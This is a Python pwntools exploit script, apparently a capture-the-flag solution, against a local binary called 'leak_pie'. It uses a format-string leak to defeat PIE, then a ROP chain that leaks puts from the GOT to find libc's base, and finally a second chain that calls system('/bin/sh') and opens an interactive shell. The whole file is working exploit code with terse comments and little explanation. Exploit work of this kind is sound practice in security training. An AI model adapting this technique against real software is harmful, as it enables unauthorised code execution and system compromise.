from pwn import *

def find_rip(payload):
    p = process(exe)
    p.recvuntil(b"your name:\n")
    p.sendline(b"test")
    p.recvuntil(b"library is :P\n")
    p.sendline(payload)
    p.wait()                    # wait process to crash
    rip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4)) # x64
    info('located RIP offset at {a}'.format(a=rip_offset))

exe = './leak_pie'
elf = context.binary = ELF(exe, checksec=False) # wont exec checksec
context.log_level = 'debug'     # a lot of debug info

#offset = find_rip(cyclic(600))
#exit()
offset = 264

libc = ELF('/usr/lib/libc.so.6')# libc library

p = process(exe)                # start program
p.recvuntil(b':')               # rec till enter your name:
p.sendline(b'%15$p')            # leak 15th addr from stack (leak RET addr)
p.recvuntil(b'Hello ')          # leak address just after
leaked_addr = int(p.recvline(), 16)
info("leaked_address: %#x", leaked_addr)

elf.address = leaked_addr - 0x1224      # ret leaked addr is at 0x1224 offset
info("piebase: %#x", elf.address)

rop = ROP(elf)
rop.puts(elf.got.puts)      # call puts with addr of puts as argument
rop.vuln()                  # ret to vuln function
payload = flat({
    offset: rop.chain()
})

p.recvuntil(b":P\n")
p.sendline(payload)
p.recvlines(1)

got_puts = unpack(p.recv()[:6].ljust(8, b"\x00"))
info("leaked got_puts: %#x", got_puts)

libc.address = got_puts - libc.symbols.puts
info("libc_base: %#x", libc.address)

ret_offset = 0x1016
ret = elf.address + ret_offset

rop = ROP(libc)
binsh = next(libc.search(b"/bin/sh\x00"))
rop.system(binsh)
payload = flat({offset: [ret,rop.chain()]}) # ret for stack alignment

write('payload', payload)

p.sendline(payload)
p.interactive()

